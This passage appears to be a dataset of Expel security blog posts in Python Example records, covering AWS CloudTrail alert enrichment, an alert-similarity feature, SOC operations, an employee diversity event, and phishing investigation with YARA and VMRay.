interesting activities recently? Has this activity happened for this user before? All of these questions can be answered by investigating CloudTrail logs, which maintain a historical record of actions taken in an AWS account. Expel collects, stores and indexes most CloudTrail logs for our AWS customers to support custom AWS alerting and have them readily available for querying to aid in triage and investigations. Note that we also collect, store and index GuardDuty logs for generating Expel alerts. These questions all feed into an enrichment workflow (see the downloadable diagram at the end of this post) that helps our team make quick and smart decisions when it comes to triaging alerts. Youll notice that this workflow supports AWS alerts for either CloudTrail or GuardDuty logs. Now Ill walk you through how we approach answering each of these questions and share my thoughts on what you should keep in mind when creating each enrichment. If the alert IAM entity is an assumed role, whats the assuming IAM entity? If an AWS alert was generated by an assumed role, its important to know the IAM principal that assumed it (yes, role-chaining is a thing) and any relevant details related to the role assumption activity. In the life cycle of an AWS compromise, a threat actor may gain access to and use several IAM users and roles. Roles are used in AWS to delegate and separate permissions and help support a least privilege security model. A threat actors access might begin with an initial user that is used to assume roles and execute privilege escalation in order to gain access to additional users and roles. Its critical, but not always simple, to know the full scope of IAM entities wielded by an attacker. For command-line, software development kit (SDK) and SwitchRole activity in the Console, we can answer this question with the userIdentity section of CloudTrail logs which contain the IAM principal making the call, including the access key used. When a role is assumed in AWS, temporary security credentials are granted in order to take on the roles access permissions. CloudTrail logs generated from additional calls using the temporary credentials (the assumed role instance) will include this access key ID in the user identity section. This allows us to link any actions taken by a particular assumed role instance and resolve the assuming IAM entity. The latter is done by finding the matching accessKeyId attribute in the responseElements section of the corresponding AssumeRole CloudTrail event log. Itll look something like this: Matching AccessKeyId activity to its corresponding AssumeRole Event Not so fast  theres other use cases While it would be great if this was all the logic required, theres an additional use case for roles that needs to be considered: AWS SSO. Federated users are able to assume roles assigned to them by their identity provider. This federated access system also provides the ability for federated users to login to the AWS Console as an assumed role . We often see assumed roles as the user identity for ConsoleLogin events when SSO is configured through SAML 2.0 Federation, but it can be performed using any of the AssumeRole* operations to support different federated access use-cases. The following diagram provides a high-level summary of the steps involved in this process: AssumeRoleWithSAML console login process The reason this process is significant is that actions taken by the assumed role in the console will use a different access key than the one in the associated AssumeRoleWithSAML event. Despite this, the corresponding AssumeRole event for this type of federated assumed role activity can still be located. Evaluating returned events Following the logic shared in the AWS blog post,  How to Easily Identify Your Federated Users by Using AWS CloudTrail , all recent AssumeRole* (that * is a wildcard) events for the role with a matching role session name are collected. The returned events are then evaluated in the following order to determine the corresponding AssumeRole* log, with the matching logic provided to the user for clarity: If one is available in the Alert source log, is there an event matching the access key ID? If one is available in the Alert source log, is there an event time matching the session context creationdate? If there is not a match for an access key ID or session creationdate, then use the most recent AssumeRole* event returned by the query. This is what we see in the Expel Workbench: Assumed role atep back enrichment output By the way, the robot referenced here is Ruxie . Did the alert IAM entity assume any roles? By including both successful and failed role assumptions, we can also see any brute force attempts to enumerate roles a user has access to. The status message of a failed AssumeRole event is used to determine the target role when a call to AssumeRole failed. Failed AssumeRole errorMessage Assumed roles enrichment output Why do we ask this question? Because it gives analysts insight into any suspicious activity involving role assumption. Determining how the role was assumed Determining how the IAM role was assumed can be a valuable piece of context to have in combination with the provided role ARN, result, count and firstlast timestamps. There are a few ways a role is typically assumed: SAML/Web identity integration AWS web console AWS native services CLI / SDK The logic is conducted in the following steps: SAML or WebFederation through the API event name (AssumeRoleWithSAML and AssumeRoleWithWebIdentity) The Web Console by looking the invoked by field (AWS Internal), source ip and UserAgent An AWS Service by looking at the invoked by field If none of the first three criteria were matches, then the interface is determined to be the AWS CLI or SDK In order to support successful and failed calls, recent AssumeRole* events are collected for the user associated with the alert regardless of authentication status code. The query used to gather AssumeRole* events for this enrichment will vary slightly depending on whether the source alert user is an IAM user or assumed role. Keep in mind that this particular workflow is also role aware. This means that additional logic is applied when gathering relevant IAM activity. When looking at AWS alerts based on an IAM user, we surface other relevant IAM activity that matches the IAM identifier. For IAM roles, we apply a filter to include roles where the session name or source IP matches what we saw in the alert. Given that roles in AWS can be assumed by multiple entities, this additional filter helps ensure that relevant results are being retrieved. What services has the alert IAM entity interacted with? Answering this question provides Expel analysts with a high level summary of the AWS services the IAM entity has interacted with in the past week. With over 200 services and counting, this enrichment helps provide information about both the type of activity the IAM entity is involved in and at what frequency. This enrichment isnt intended to act as a singular decision point, but rather help provide a simple summary of what services are in scope for the IAM entity in terms of actual interaction. When an alert moves into an investigation for a deeper dive, it also provides information on AWS services that the IAM recently interacted with that would be highly valuable for a potential attacker (EC2, IAM, S3, SSM, database services, lambda, Secrets Manager and others). Additional context applied in tandem with this enrichment can help us gather more insights, like an account used by automation deviating from the normally used services. To determine what services a user interacted with, all of the principals CloudTrail events over the previous week are queried. The total of each unique value is calculated to determine counts for each AWS service the alert user interacted with. Interacted services enrichment output Has the alert IAM entity made any recent interesting API calls? We define interesting API calls to be any AWS ApiEvent that doesnt have a prefix of Get (excluding GetPasswordData), List, Head or Describe, or have a failed event status. Having details on these types of activities is critical in determining if an alert is a true positive. After a threat actor gains access into an AWS account, theyre likely going to perform modifying API calls related to persistence, privilege escalation and data access. Some prime examples of modifying calls are AuthorizeSecurityGroupIngress, CreateKeyPair, CreateFunction, CreateSnapshot and UpdateAssumeRolePolicy. In our recent blog post , we noted the highly suspicious output provided by this enrichment: Expel Workbench alert example While API calls that return AWS information, such as DescribeInstances, are going to be important when scoping recon activity for established unauthorized access, theyre extremely common for most IAM entities. However, we do include them by capturing any failed API calls when we observe a high number of unauthorized access, notably when its first gained for an IAM entity and a threat actor is unfamiliar with its permissions. They may be attempting to browse to different services in the console or running automated recon across services that they dont have required permissions. How does the alert activity align with historical usage for the IAM entity? Lastly, we need to evaluate whether this activity is normal for this IAM entity. To answer this question, we first need to decide on the window of time that makes up normal activity. We found that going back two weeks, while skipping the last 12-hours of CloudTrail activity, provides a sufficient historical view while also reducing the likelihood that we show our analysts data tainted by the recent activity related to the alert. Within the window of time we lift all API calls for the user in question along with their associated user agents and IP addresses across the two weeks. This is when we look to CloudTrail. We pull out activity from CloudTrail that matches an ARN or principal ID, we use different logic for assumed rules which we previously discussed. In order to summarize this data and compare the access attributes, we slice and dice it into the following views: How many times has the IAM entity made this API call from the same IP and user-agent? (GuardDuty based alerts will be compared on the IP only because they do not contain user agent details.) What IPs and user-agent has this IAM entity historically called this API with? What IPs and user-agent has this IAM entity historically used in all of its API calls? The data comes out looking like this in our Expel Workbench: This powerful enrichment allows our analysts to quickly understand if this activity for an IAM entity is common and how they interact with AWS services. User-agents associated provide useful insights if certain service interactions for an IAM entity are typically console based, via the AWS CLI or with a certain type of AWS SDK. While a threat actor can easily spoof user-agents, aligning unauthorized access with an IAM entitys historical activity is a much tougher task. Parting thoughts and a resource for you Rather than having analysts repeatedly perform tedious tasks for each AWS alert, these enrichments empower their decision making while simultaneously establishing standardization. The enrichment outputs work in tandem to provide a summary of both relevant recent and historical activity associated with the IAM entity to answer key questions in the AWS alert triage process. Below is the workflow I walked you through in this post. Feel free to use it as a resource when assessing how CloudTrail logs can help automate AWS alert enrichments in your own environment. If you have questions, reach out to me on Twitter or contact us here . Wed love to chat with you about AWS security.'}) (input_keys={'title'}),
  Example({'title': 'How we built it: Alert Similarity', 'url': 'https://expel.com/blog/how-we-built-it-alert-similarity/', 'date': 'Aug 15, 2022', 'contents': 'Subscribe  EXPEL BLOG How we built it: Alert Similarity Security operations  7 MIN READ  DAN WHALEN AND PETER SILBERMAN  AUG 15, 2022  TAGS: Tech tools TL;DR Our Alert Similarity tool lets us teach our bots to compare similar documents and suggest or recommend a next step, freeing up our analysts. Heres a walk-through of how we developed it. In this post, Dan Whalen and Peter Silberman walk you through how we developed it. Hint: the process begins with an informed hunch and ends with analysts freed up to do more of what analysts do best. Since the beginning of our journey here at Expel, weve invested in creating processes and tech that set us up for success as we grow  meaning we keep our analysts engaged (and help them avoid burnout as best we can) while maintaining the level of service our customers have come to expect from us. One of the features we recently built and released helps us do all of this: Alert Similarity. Why did we build it and how does it benefit our analysts and customers? Heres a detailed look at how we approached the creation of Alert Similarity. If youre interested in trying to develop a similar feature for your own security operations center (SOC), or learning about how to bring research to production, then read on for tips and advice. Getting started In our experience, its best to kick off with some research and experimentation  this is an easy way to get going and start identifying low-hanging fruit, as well as to find opportunities to make an impact without it being a massive undertaking. We began our Alert Similarity journey by using one of our favorite research tools: a Jupyter notebook . The first task was to validate our hypothesis: we had a strong suspicion that new security alerts are similar to others weve seen in the past. To test the theory, we designed an experiment in a Jupyter notebook where we: Gathered a representative sample set of alerts; Created vector embeddings for these alerts; Generated an n:n similarity matrix comparing all alerts; and Examined the results to see if our hypothesis held up. We then gathered a sample of alerts over a few months (approximately 40,000 in total). This was a relatively easy task, as our platform stores security alerts and we have simple mechanisms in place to retrieve them regularly. Next, we needed to decide how to create vector embeddings. For the purposes of testing our hypothesis, we decided we didnt need to spend a ton of time perfecting how we did it. If youre familiar with generating embeddings, youll know this usually turns into a never-ending process of improvement. To start, we just needed a baseline to measure our efforts against. To that end, we chose MinHash as a quick and easy way to turn our selected alerts into vector embeddings. What is MinHash and how does it work? MinHash is an efficient way to approximate the Jaccard Index between documents. The basic principle is that the more data shared between two documents, the more similar they are. Makes sense, right? Calculating the true Jaccard index between two documents is a simple process that looks like this: Jaccard Index = (Intersection of tokens between both documents) / (Union of tokens between both documents) For example, if we have two documents: The lazy dog jumped over the quick brown fox The quick hare jumped over the lazy dog We could calculate the Jaccard index like this: (the, dog, jumped, over, quick) / (the, lazy, dog, jumped, over, quick, brown, fox, hare)  5 / 6  0.8333 This is simple and intuitive, but at scale it presents a problem: You have to store all tokens for all documents to calculate this distance metric. In order to calculate the result, you inevitably end up using lots of storage space, memory, and CPU. Thats where MinHash comes in. It solves the problem by approximating Jaccard similarity, yet only requires that you store a vector embedding of length K for each document. The larger K, the more accurate your approximation will be. By transforming our input documents (alerts) into MinHash vector embeddings, were able to efficiently store and query against millions of alerts. This approach allows us to take any alert and ask, What other alerts look similar to this one? Similar documents are likely good candidates for further inspection. Validating our hypothesis Once we settled on our vectorization approach (thanks, MinHash!), we tested our hypothesis. By calculating the similarity between all alerts for a specific time period, we confirmed that 5-6% of alerts had similar neighbors (Fig 2.). Taking that even further, our metrics allowed us to estimate actual time savings for our analysts (Fig 3.). Fig. 2: Percentage of alerts with similar neighbors Fig 3. Estimated analyst hours saved (extrapolated) These metrics proved that we were onto something. Based on these results, we chose building an Alert Suggestion capability off the back of Alert Similarity as our first use case to target. This use case would allow us to improve efficiencies in our SOC and, in turn, enhance the level of service we provide to our customers. Our journey to production Step 1: Getting buy-in across the organization Before moving full speed ahead into our project, we communicated our research idea and its potential benefits across the business. The TL;DR here? You cant get your colleagues to buy into a new idea unless they understand it. Our R&amp;D groups pride themselves on never creating Tad-dah! Its in production! moments for Engineering or Product Management without them having the background on new projects first. We created a presentation that outlined the opportunity and our research, and allowed Expletives (anyone from Product Management to Customer Success to Engineering) to review our proof of concept. In this case, we used a heavily documented notebook to walk viewers through what we did. We discussed our go-forward plan and made sure our peers across the organization understood the opportunity and were invested in our vision. Step 2: Reviewing the design Next, we created a design review document outlining a high-level design of what we wanted to build. This is a standard process at Expel and is an important part of any new project. This document doesnt need to be a perfect representation of what youll end up building, nor does it need to include every last implementation detail, but it does need to give the audience an idea of the problem youre aiming to solve and the general architectural design of the solution youre proposing. Heres a quick look at the design we mocked up to guide our project: As part of this planning process, we identified the following goals and let those inform our design: Build new similarity-powered features with little friction Monitor the performance and accuracy of the system Limit complexity wherever possible (dont reinvent the wheel) Avoid making the feature availability mission critical (so we can move quickly without risk) As a result of this planning exercise, we concluded that we needed to build the following components: Arnie (Artifact Normalization and Intelligent Encoding): A shared library to turn documents at Expel into vector embeddings Vectorizor consumer: A worker that consumes raw documents and produces vector embeddings Similarity API: A grpc service that provides an interface to search for similar documents We also decided that we wouldnt build our own vector search database and instead decided to use Pinecone.io to meet this need. This was a crucial decision that saved us a great deal of time and effort. (Remember how we said we wouldnt reinvent the wheel?) Why Pinecone? At this stage, we had a good sense for our technical requirements. We wanted sub-second vector search across millions of alerts, an API interface that abstracts away the complexity, and we didnt want to have to worry about database architecture or maintenance. As we examined our options, Pinecone quicky became our preferred partner. We were really impressed by the performance we were able to achieve and how quick and easy their service was to set up and use. Step 3: Implementing our Alert Similarity feature Were lucky to have an extremely talented core platform team here at Expel infrastructure capabilities we can reliably build on. Implementing our feature was as simple as using these building blocks and best practices for our use case. Release day Once the system components were built and running in staging, we needed to coordinate a release in production that didnt introduce risk into our usual business operations. Alert Suggestion would produce suggestions in Expel Workbench like this, which could inform decisions made by our SOC analysts. However, if our feature didnt work as expected  or worse, created incorrect suggestions  we could cause confusion or defects in our process. To mitigate these risks when moving to production, it was important to gather metrics on the performance and accuracy of our feature before we started putting suggestions in front of our analysts. We used LaunchDarkly and Datadog to accomplish this. LaunchDarkly feature flags allowed us to deploy to production silently  meaning it runs behind the scenes and is invisible to end users. This allowed us to build a Datadog dashboard with all kinds of useful metrics like: How quickly were able to produce a suggestion The percentage of alerts we can create suggestions for How often our suggestions are correct (we did this by comparing what the analyst did with the alert versus what we suggested) Model performance (accuracy, recall, F1 score) The time it takes analysts to handle alerts with and without suggestions To say these metrics were invaluable would be an understatement. Deploying our feature silently for a period of time allowed us to identify several bugs and correct them without having any impact on our customers. This boosted confidence in Alert Similarity before we flipped the switch. When the time came, deployment was as simple as updating a single feature flag in LaunchDarkly. What weve learned so far We launched Alert Similarity in February 2022, and throughout the building process we learned (or in many cases, reaffirmed) several important things: Communication is key. You cant move an organization forward with code alone. The time we spent sharing research, reviewing design documents, and gathering feedback was crucial to the success of this project. Theres nothing like real production data. A silent release with feature flags and metrics allowed us to identify and fix bugs without affecting our analysts or customers. This approach also gave us data to feel confident that we were ready to release the feature. Well look to reuse this process in the future. If you cant measure it, you dont understand it. This whole journey from beginning to end was driven by data, allowing us to move forward based on a validated hypothesis and realistic goals versus intuition. This is how we knew our investment was worth the time and how we were able to prove the value of Alert Similarity once it was live. Whats next? Although we targeted suggestions powered by Alert Similarity as our first feature, we anticipate an exciting road ahead filled with additional features and use cases. Were interested in exploring other types of documents that are crucial to our success and how similarity search could unlock new value and efficiencies. Additionally, as we alluded to above, theres always room for improvement when transforming documents into vector embeddings. Were already exploring new ways to represent security alerts that improve our ability to find similar neighbors for alerts. We see a whole world of opportunities where similarity search can help us, and well continue experimenting, building and sharing what we learn along the way. Interested in more engineering tips and tricks, and ideas for building your own features to enhance your service (and make your analysts lives easier?) Subscribe to our blog to get the latest posts sent right to your inbox.'}) (input_keys={'title'}),
  Example({'title': 'How we built it: the Expel SOC-in-the-Sky', 'url': 'https://expel.com/blog/how-we-built-it-the-expel-soc-in-the-sky/', 'date': 'Mar 10, 2023', 'contents': 'Subscribe  EXPEL BLOG How we built it: the Expel SOC-in-the-Sky Expel insider  2 MIN READ  JON HENCINSKI  MAR 10, 2023  TAGS: MDR This February, over 400 Expletives flocked from all over to convene in Miami for our first-ever company kickoff (CKO) celebration. It was a week of laughs, collaboration, excitement, and, for some of us, in-person introductions to co-workers weve only ever met via Zoom. But with great events come great logistical challenges, particularly for a 247 service like ours. So the question became: how do we ensure the hardworking folks in the Expel security operations center (SOC), who so often devote their nights and weekends to our customers, can also come to Miami and benefit from in-person camaraderie? Turns out, the answer was a SOC-in-the-Sky. This meant converting a multi-purpose room on the top floor of the hotel hosting CKO (S/O to the Hyatt Regency, Miami) into an around-the-clock mobile SOCwhich we called SOC-in-the-Sky because how cool does that sound? The team touched down the Saturday before the festivities and got to work outfitting the space with the necessary infrastructure. That included making sure we had things like external monitors, privacy screens, redundant power supplies, fast internet connections, and just the right amount of physical security to protect the space. And of course, the requisite amount of energy drinks. Now, its a SOC. All of these details set up our SOC for success to do what they do: monitor and defend more than 300 customers and their entities from cyber attacks. To put that into perspective, over 300 customers and their entities means continuously: monitoring millions of endpoints, identities, cloud resources and workloads distributed across five different continents, and providing phishing expertise to hundreds of thousands of people around the world. Over the course of a typical day in our SOC-in-the-Sky, we processed around 2.5-3.5 billion events from 100+ tech integrations with our platform. Those events were all processed through Josie, our detection bot, who filtered and passed better than a thousand events to the Expel team for human judgment. Those filtered events were then picked up in mere minutes by our SOC analysts. The SOC team runs hundreds of investigative actions through Expel Workbench, our security operations platform, and in the process they identify somewhere between 10-15 security incidents for multiple customers. These security incidents are a mix of account takeover activity, deployment of malware to gain initial access by ransomware operators, abuse of cloud misconfigurations, and authorized red teams. Ruxie, our orchestration bot, runs thousands of investigative actions on behalf of our analysts. Ruxie is also smart enough to make triage decisionsit closes around 5% of the alerts sent to the Expel SOC for review and handles about a third of all investigations performed in any given day. Lets see, what else? Oh, right. We investigate around 1,000 suspicious email submissions from our customers each day. How the heck do we do it? We put information and people in the exact right place at the exact right moment. The net of it all is were able to take billions of events, use the right mix of people and technology to find the things that matter quickly, figure out what happened, and take action to reduce risk. This is what happened in the SOC-in-the-Sky. It was the physical representation of the intersection of our platform and our people, each doing what they do best. Want a deeper dive into the patterns and trends our SOC identified last year? Check out our annual threat report, Great eXpeltations , for a behind-the-scenes peak.'}) (input_keys={'title'}),
  Example({'title': "How WE celebrated Women's History Month at Expel", 'url': 'https://expel.com/blog/how-we-celebrated-womens-history-month-at-expel/', 'date': 'Apr 7, 2023', 'contents': 'Subscribe  EXPEL BLOG How WE celebrated Womens History Month at Expel Talent  3 MIN READ  BROOKE MCCLARY AND NEIKO LAMPKIN  APR 7, 2023  TAGS: Careers / Company news We never pass up the opportunity to celebrate women at Expel, and Womens History Month in March is one of our favorite times of the year to do just that. Were pretty proud of our employee resource groups (ERGs) at Expelwhich include BOLD (our ERG for Black Expletives and allies), The Treehouse (our LGBTQIA+ and allies), The Connection (for supporting each others mental health), and WE (the Women of Expel and allies). Founded in 2018, WE was Expels first ERG, and weve since reorganized and expanded to capture the spirit of the crew thats helping to power, scale, shape, and drive the company to ever-greater heights. This years WE Womens History Month programming centered on the interconnectivity between all our ERGs and focused on how we can elevate each other, both in March and year-round. Heres a quick recap. WE heardand learnedfrom Dr. Kumea Shorter-Gooden. Early in the month, our WE and BOLD ERGs co-hosted an engaging discussion led by Dr. Kumea Shorter-Gooden , co-author of Shifting: The Double Lives of Black Women in America. Dr. Shorter-Goodens session, Doing Double Duty: Black Women in the World of Work, addressed common ways Black women are forced to shift as a response to racial and gender bias in the workplace. Dr. Shorter-Gooden acknowledged that Black womens mistakes are often hyper-visible, yet successes are invisible; this is a vexing challenge thats near-impossible to navigate. She offered advice on how allies can show up for Black women and others with marginalized identities, and attendees left with a better understanding of the lived experiences of our fellow Expletives. WE highlighted badass change-makers from the past 25 years. Each week, we celebrated a woman from recent history who forged a path for herself and others, with each spotlight focusing on someone representing one of our ERGs. The list included: Amanda Gorman : The youngest inaugural poet (at just 22) in U.S. history. You might remember her from President Bidens inauguration, where she delivered an original poem titled, The Hill We Climb. Rosemary Ketchum : In 2020, Rosemary shattered the  lavender ceiling  and became the first out trans person to be elected in West Virginia. Bren Brown : A research professor at the University of Houston who holds a doctoral degree in social work, Bren is famous for her viral talks on a range of uncomfortable emotions. Taraji P. Henson : Actress, producer, author, and long time mental health advocate, Taraji founded the Boris Lawrence Henson Foundation in 2018 with a focus on providing options for therapy to Black men in particular. WE spotlighted the women of Expel who make a big impact, every day. We also took some time to recognize and celebrate each other with daily Slack spotlights the on women Expletives who make a big impact across our organization. Our own Nicole Jouvelakas, Director, Growth Marketing, collected survey responses from anyone interested in submitting across the entire organization. And the results were inspiring. An example of a daily Slack spotlight celebrating the women of Expel Why did we do this? Because when we lift each other up, we all benefit. We also heard from Tina Velez, Manager, Solution Architecture, in our LnL (Live n Learn) series, where she walked us through each of her career stops. This riveting discussion, which she called I love fire, focused on the challenges she faced working in male-dominated fields and, most importantly, how she overcame the headwinds to succeed every time. WE visited Sweetbriar College for an important Women in Tech Panel. On March 30, members of our WE ERG took a short road trip to Sweetbriar College to host a Women In Tech Panel showcasing what its like to work in tech, and the variety of roles within the tech space (in fewer words: you dont have to be an engineer to work in tech) . Sweetbriar has one of only two (Accreditation Board for Engineering and Technology) ABET-accredited engineering programs at womens colleges in the United States. WE participated in InHerSights Womens History Month campaign. InHerSight an anonymous platform measuring how well companies support women employeesused March to highlight some of the amazing women at its partner companies. They asked women to tell [them] why theyre proud of their background or how their identity influences how they show up, whether for work or life. Expels Orianna Bilby, Principal Program Manager, Engineering, answered the call, resulting in this LinkedIn feature. Orianna shares her perspective with InHerSight WE explored the intersectionality of womens stories with those of other marginalized groups. First, BOLDs monthly discussion centered on Centering Black Muslim Women during Womens History Month and Ramadan . Attendees spent time Listening to the Stories of Black Muslim Women and discussed ways to be mindful of womens experiences, the role intersectionality plays in the unique experiences of women that belong to additional marginalized groups, and our own personal experiences with holding those within our circles accountable in our fight for a just, equitable, and inclusive society for women. Then the monthly Treehouse session considered the Divine Feminine . This open dialogue revolved around defining the concept, how members personally connect with it, and how it affects social and political spaces. Like we said up top, we never pass up the opportunity to celebrate women at Expeland that wont stop after March. Keep an eye on our socials ( @ExpelSecurity ) throughout the year as we periodically highlight our women colleagues, and check out our equity, inclusion, and diversity (EID) page to learn more about our ERGs.'}) (input_keys={'title'}),
  Example({'title': 'How we spotted it: A Silicon Valley Bank phishing attempt', 'url': 'https://expel.com/blog/how-we-spotted-it-a-silicon-valley-bank-phishing-attempt/', 'date': 'Mar 24, 2023', 'contents': 'Subscribe  EXPEL BLOG How we spotted it: A Silicon Valley Bank phishing attempt Security operations  2 MIN READ  HIRANYA MIR, JOSE TALENO AND CHRISTINE BILLIE  MAR 24, 2023  TAGS: MDR / Tech tools As we wrote recently , we expected the failure of Silicon Valley Bank (SVB) to open the door to counterparty fraud attempts. Our CISO Greg Notch explained: An increased volume of bank account switching presents a massive opportunity for payment counterparty fraud. If an attacker is able to deceive someone into altering a few account and routing numbers, they can direct money to themselves, rather than your vendor or into your own accounts. Often this begins with compromised or forged emails resulting from business email compromise (BEC). Depending on the size of your environment, this may go unnoticed for some time. By the time you detect the attack, you could be out a significant amount of moneyand youll still owe your vendor. As expected, it wasnt long before we saw our first fraud attempt via phishing attack. Since we knew our customers would likely be targets of SVB phishing attempts, our security operations center (SOC) analysts were on it before the customer could even submit the suspicious email to our phishing team. Heres how we did it. First, our analysts created a YARA rule to help identify any emails with affiliated keywords or domains, automatically adding them into our high-priority investigation queue. As it turns out, this is exactly how the attack began (see step 1 in the below graphic). A rule match increased the severity of the alert in our queue in order to get eyes on it ASAP, and we noted that the email headers displayed signs of possible spoofing. (When we see the spf=fail value, were immediately suspicious.) From there, we saw that the senders IP address wasnt affiliated with DocuSign, so there were red flags popping up all over. In step 2, we examined the body of the email. The email addresskycrefreshteam@svb.comis the sender posing as an SVB employee. Its important to note this email did not actually come from anyone at SVB. However, the attacker is impersonating an employee to masquerade as a legitimate party. At first glance, the email looks legitimate. There are no obvious spelling, grammar, or punctuation errors. However, given the circumstances surrounding the collapse of the bank and the red flags identified in step 1, were closer to knowing for sure that this is a phishing attempt. Its standard practice in our SOC to double-check any risks associated with action requests within an email, which we see in step 3. The review documents button in the email leads to an illegitimate customer login page, spoofed to mimic a page on the customers website, which asks users to submit their SVB account credentials. In this case, our custom YARA detection ruleset up to flag specific malicious domains for SVBflagged the phishing attempt for additional urgency and scrutiny , but we essentially go through the same sort of investigation for any suspicious email that customers submit to our phishing team. Unfortunately, we expect to see more of this sort of activity in the coming days and weeks, especially as the banking industry navigates some choppy waters. If youre interested in our phishing offering, click here to learn more.'}) (input_keys={'title'}),
  Example({'title': 'How we use VMRay to support Expel for Phishing', 'url': 'https://expel.com/blog/how-we-use-vmray-to-support-expel-for-phishing/', 'date': 'Sep 21, 2021', 'contents': 'Subscribe  EXPEL BLOG How we use VMRay to support Expel for Phishing Security operations  4 MIN READ  RAY PUGH AND HIRANYA MIR  SEP 21, 2021  TAGS: MDR / Tech tools Tech helps us create space to focus on building human expertise. For example, tools like VMRay allow us to use a hands-on approach to phishing email triage here at Expel. Automated email solutions are an excellent supplement, but theres no replacement for human eyes on a suspicious sample that slips through the cracks. TL;DR: We harness the human moment to identify the full scope of risk to our customers environments. As part of our phishing service, we use automation to triage phishing emails , and our analysts look at every email that our customers users report. We also help our customers get the full picture of whats happening in their environment by integrating with their endpoint detection and response (EDR) tools. How does it work? First, a customer end-user hits the suspicious email reporting button, which generates an alert for analyst review in the Expel Workbench. Enrichment and automation surface supplementary information in an easily digestible way. From there, we decide whether the email is benign or poses a threat to the customer environment. When a threat is found, we quickly get to work answering two key questions: Who else received this email? Was anyone compromised? To answer these questions, we connect to the customers tech stack  whether its email message trace logs stored in their SIEM, network traffic monitored through their firewall or endpoint signal through their EDR. We use the indicators from a malicious email and the tech stack to determine whether compromises are present in the environment. If we spot a compromise, we notify our customer immediately so we can work in parallel to get the threat remediated. In this post, well walk you through how we use VMRay for our Expel managed phishing service , and share our thoughts on how VMRay can help you protect your orgs environment. Tools we use to investigate potentially malicious emails We use both internally built tools as well as enrichment pulled through third-party sources to perform analysis. The most important capability in our investigative toolkit is VMRay. Whether its investigating a suspicious link that redirects to a credential harvester or a suspicious Microsoft Word document that may contain malicious macros  VMRay allows us to detonate these samples safely and generate a detailed report of resulting activity. Armed with this information, we provide detailed, thorough recommendations to our customers. Why we chose VMRay VMRay integrates well with our approach because, whether its through manual input in the VMRay console or uploading content through the API, were able to send numerous samples at one time for analysis simultaneously. This tech gives our analysts the space to multitask and, as a result, ensure we provide timely results and responses to our customers. Considering we operate in an industry where minutes matter  this can make all the difference when it comes to stopping evil before bad things happen. VMRay also makes it easy to interact with malicious content. It performs analysis automatically, and offers an interactive mode when needed. And, again, we love that it generates detailed analytical findings reports. Investigating a phishing email using VMRay We routinely use VMRay for two types of email threats: suspicious links within the body of an email and suspicious files included with an email as attachments. For suspicious links, we submit the URL in question to VMRay for both static and dynamic analysis, defaulting to automated mode and including interactive mode in some circumstances. This provides our analysts with the flexibility to simulate a normal user and extract all of the malicious indicators safely. The detailed report available immediately following analysis serves as the basis for scoping the customers environment for signs of compromise. Below is an example of what one of these reports look like. VMRay web analysis report VMrays web analysis report tells us that theres a redirect to another site which contains a logon page. This is a key indicator that were dealing with a credential harvesting page. Example VMRay visual cue VMray generates screenshots after its analysis report to provide visual cues. In this case, we observe a suspicious URL enticing the user to interact with another link to access a fake proposal document. Credential harvesting landing page After the user interacts with the link theyre redirected to a credential harvesting landing page Fake sign-in page example In the image above, you see that after several attempts the user is redirected to a Microsoft page which gives the illusion that its legitimate. Microsoft Defender for Endpoint Youll see that we use Microsoft Defender for Endpoint to identify potential clickers by scoping for the malicious domains on the endpoint. Microsoft Defender for Endpoint Since we didnt generate any results scoping the malicious domain, we can confidently conclude that no one was compromised. Some malware is configured to detect and evade sandboxes, so VMRay simulates a realistic user endpoint complete with files, user profiles, simulated cursor movement and other attributes to combat this attacker technique and fool the malware into executing. If malicious, the file executes thinking it landed on an unsuspecting host and VMRay tracks all of its behavior. At the end, our analysts are able to review the results for key indicators which we can use to scope the customers environment for signs of compromise. VMRay dynamic analysis Above is a screenshot of a VMray dynamic analysis report. What were seeing indicates that the Excel file contains VBA macros which is a common way attackers embed malicious code. Another interesting observation is that upon execution it creates a process curl suggesting the file maybe trying download another payload. How we use VMRay to further scope our customers tech for signs of compromise Analysts use the indicators from the VMRay analysis to scope the respective customers environment for any signs of potential compromise. The Expel Workbench lets our analysts query automatically through the API, but analysts can also pivot directly into the console for further investigation when necessary. If there arent signs of compromise, which is often the case as we aim to stay ahead of the threat, we give our customers succinct recommendations to stop the threat in its tracks. In cases where signs of active compromise are discovered, we engage the customer immediately for remediation and work collaboratively until the situation is fully resolved. How you can use VMRay in your own environment Weve continually expanded our managed phishing service , which is why weve made an optimized integration with VMRay and its suite of capabilities a priority. This helps us maintain efficiency and accuracy while minimizing risk for our analyst team. Analyzing numerous samples at the same time while gathering detailed data about each sample is truly a game changer, especially for a pervasive industry threat like phishing. Lastly, the features and ease of use help analysts of all experience levels build their investigative muscles. Automating key pieces of the investigative process helps to speed up the already steep learning curve for newer team members. Phishing attacks are on the rise  especially business email compromise (BEC). Want to find out how we protect our customers from BEC? Check out Expel for Email .'}) (input_keys={'title'}),
  Example({'title': 'Improving the phishing triage process: Keeping our ...', 'url': 'https://expel.com/blog/improving-the-phishing-triage-process/', 'date': 'Jan 5, 2021', 'contents': 'Subscribe  EXPEL BLOG Improving the phishing triage process: Keeping our analysts (and our customers) sane Security operations  8 MIN READ  BEN BRIGIDA, PETER SILBERMAN AND RAY PUGH  JAN 5, 2021  TAGS: MDR / Tech tools Manually triaging phishing emails is painful. Weve heard from customers that of those who employ analysts in house to focus solely on phishing, the retention rate of those employees is usually less than a year. No wonder. The work is never-ending. Billions of malicious emails are sent each day. And thats not even the bulk of it. End users, if properly trained, will smash the phishing reporting button for anything suspicious or annoying. Plenty of marketing emails and spam messages get caught in the nets (sorry, marketers  just calling it like we see it). This tedious work is what makes triage so painful. Analysts have to figure out if the email is bad, and if it is, they need to investigate it. According to APWGs 2020 Phishing Activity Trends Report , attackers create nearly 200,000 unique malicious websites and over 100,000 unique malicious subjects per month. Thats a lot of copy-pasting. Yet the importance of reviewing reported phishing emails cant be understated. Phishing is the primary source of compromises , and has been for some time . So how do you balance the importance of reviewing phishing emails with the monotony of the work? Thats exactly what were working to solve for here at Expel. Get the right people and then build the right tech First, we set out to solve the people problem. By that we mean: how can we do high-quality work without making our people miserable? We assembled a diverse, enthusiastic team of skilled analysts. ( This piece is really important .) Next, we set out to change the game and make phishing triage phun again (cant stop, wont stop). At Expel we believe analysts need meaningful and interesting work. So we had to figure out how to make phishing meaningful to us while also delivering value to our customers. We decided we dont want to stop at just telling our customers that an email is bad. We also want to tell them things like; who else got the email and was anyone compromised (meaning someone clicked the link and submitted data, downloaded/executed the attachment, etc). These are the questions we think are most important to our Expel for Phishing customers. And we think they 